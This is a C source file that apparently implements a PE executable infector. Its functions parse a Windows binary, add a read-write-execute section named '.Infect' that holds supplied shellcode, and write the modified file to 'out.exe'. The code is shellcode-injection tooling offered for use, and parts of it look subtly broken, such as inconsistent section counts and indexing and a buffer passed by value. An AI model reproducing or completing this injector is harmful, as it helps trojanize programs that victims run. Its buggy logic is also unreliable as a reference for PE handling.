#include "PE.h"

DWORD align(DWORD size, DWORD align, DWORD addr)
{
	if (!(size % align))
	{
		return addr + size;
	}
	return addr + (size / align + 1) * align;
}

void init(FILE *peFile, PE_Info *pe, CHAR *buffer)
{
	// Get size file
	fseek(peFile, 0L, SEEK_END);
	pe->dwImageSizeOnDisk = ftell(peFile);
	fseek(peFile, 0L, SEEK_SET);

	// Get data file
	buffer = (CHAR*)malloc(pe->dwImageSizeOnDisk);
	fread(buffer, pe->dwImageSizeOnDisk, 1, peFile);
	pe->dwImage = (DWORD)buffer;

	// Put data in IMAGE_DOS_HEADER
	pe->pDosHeader = (PIMAGE_DOS_HEADER)(pe->dwImage);

	// Put data in Dos_Stup
	pe->dwDosStup = (CHAR*)(pe->dwImage + sizeof(IMAGE_DOS_HEADER));

	// Put data in IMAGE_NT_HEADERS
	pe->pNtHeaders = (PIMAGE_NT_HEADERS)(((DWORD)pe->dwImage) + pe->pDosHeader->e_lfanew);

	// Put data in IMAGE_SECTION_HEADER
	for (int i = 0; i < pe->pNtHeaders->FileHeader.NumberOfSections; i++)
	{
		pe->pSectionHeader[i] = (PIMAGE_SECTION_HEADER)(((DWORD)pe->dwImage) +
			pe->pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER)*i);
	}
}

void addSection(PE_Info pe, int sizeShellCode, char *shellCode)
{
	PE_Info PI;
	PI.pDosHeader = (PIMAGE_DOS_HEADER)pe.pDosHeader;
	PI.dwDosStup = (CHAR*)pe.dwDosStup;
	PI.pNtHeaders = (PIMAGE_NT_HEADERS)pe.pNtHeaders;
	PI.pNtHeaders->FileHeader.NumberOfSections = (WORD)pe.pNtHeaders->FileHeader.NumberOfSections + 1;
	PI.pNtHeaders->OptionalHeader.SizeOfImage = 
		PI.pNtHeaders->OptionalHeader.SizeOfImage + sizeof(IMAGE_SECTION_HEADER);
	
	for (int i = 0; i < pe.pNtHeaders->FileHeader.NumberOfSections; i++)
	{
		PI.pSectionHeader[i] = pe.pSectionHeader[i];
	}

	IMAGE_SECTION_HEADER SH;
	CopyMemory(SH.Name, ".Infect", 8);
	SH.Misc.VirtualSize = align(sizeShellCode, pe.pNtHeaders->OptionalHeader.SectionAlignment, 0);
	SH.VirtualAddress = align(SH.Misc.VirtualSize,pe.pNtHeaders->OptionalHeader.SectionAlignment,
		pe.pSectionHeader[pe.pNtHeaders->FileHeader.NumberOfSections - 2]->VirtualAddress);
	SH.SizeOfRawData = align(sizeShellCode, PI.pNtHeaders->OptionalHeader.FileAlignment, 0);
	SH.PointerToRawData = align(SH.SizeOfRawData,PI.pNtHeaders->OptionalHeader.FileAlignment,
		pe.pSectionHeader[pe.pNtHeaders->FileHeader.NumberOfSections - 2]->PointerToRawData);
	SH.Characteristics = 0xE00000E0;

	PI.pSectionHeader[pe.pNtHeaders->FileHeader.NumberOfSections] = &SH;
	writeToFile(PI, pe, sizeShellCode, shellCode);
}

void writeToFile(PE_Info PI, PE_Info pe, int sizeShellCode ,char *shellCode)
{
	char nullBuffer = 0x00;
	FILE *peFile;
	peFile = fopen("out.exe", "wb");
	fwrite(PI.pDosHeader, sizeof(IMAGE_DOS_HEADER), 1, peFile);
	fwrite(PI.dwDosStup, pe.pDosHeader->e_lfanew - sizeof(IMAGE_DOS_HEADER), 1, peFile);
	fwrite(PI.pNtHeaders, sizeof(IMAGE_NT_HEADERS), 1, peFile);

	for (int i = 0; i < pe.pNtHeaders->FileHeader.NumberOfSections - 1; i++)
	{
		fwrite(PI.pSectionHeader[i], sizeof(IMAGE_SECTION_HEADER), 1, peFile);
	}
	fwrite(PI.pSectionHeader[pe.pNtHeaders->FileHeader.NumberOfSections],
		sizeof(IMAGE_SECTION_HEADER), 1, peFile);

	// Write sections
	for (int i = 0; i < pe.pNtHeaders->FileHeader.NumberOfSections - 1; i++)
	{
		fseek(peFile, PI.pSectionHeader[i]->PointerToRawData, SEEK_SET);
		fwrite((char *)(pe.dwImage + PI.pSectionHeader[i]->PointerToRawData),
			PI.pSectionHeader[i]->SizeOfRawData, 1, peFile);
	}

	fwrite(shellCode, sizeShellCode, 1, peFile);
	for (int i = 0; 
	i < PI.pSectionHeader[pe.pNtHeaders->FileHeader.NumberOfSections]->SizeOfRawData - sizeShellCode
		; i++)
	{
		fwrite(&nullBuffer, 1, 1, peFile);
	}
	fclose(peFile);
}
